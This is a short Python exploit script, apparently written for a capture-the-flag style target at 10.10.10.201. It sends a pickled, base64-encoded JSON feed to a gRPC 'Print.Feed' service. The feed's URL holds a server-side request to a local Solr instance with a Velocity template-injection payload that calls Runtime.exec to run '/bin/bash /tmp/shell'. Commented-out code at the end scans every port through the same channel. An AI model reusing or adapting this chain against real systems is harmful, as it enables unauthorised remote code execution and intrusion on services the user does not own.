import grpc
import service_pb2
import service_pb2_grpc
import requests
import pickle
import os
from base64 import b64encode
import concurrent.futures


def gen_payload():
     
    json = '{"version": "v1.0", "title": "PrinterFeed", "feed_url": "http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27/bin/bash%20/tmp/shell%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"}'
    print(json)
    return json


channel = grpc.insecure_channel('10.10.10.201:9000')
stub = service_pb2_grpc.PrintStub(channel)
payload = gen_payload()
payload = b64encode(pickle.dumps(payload))
response = stub.Feed(service_pb2.Contents(data=payload))
print(response)


# with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
#     jobs = []
#     for port in range(0, 65535):
#         jobs.append(executor.submit(port_check, port))

#     for future in concurrent.futures.as_completed(jobs):
#         port, output = future.result()
#         print(f"{output} - {port}")
# print(port_check('8983'))
# channel = grpc.insecure_channel('10.10.10.201:9000')
# stub = service_pb2_grpc.PrintStub(channel)
# payload = pickle.dumps(port_check())
# response = stub.Feed(service_pb2.Contents(data=b64encode(payload)))
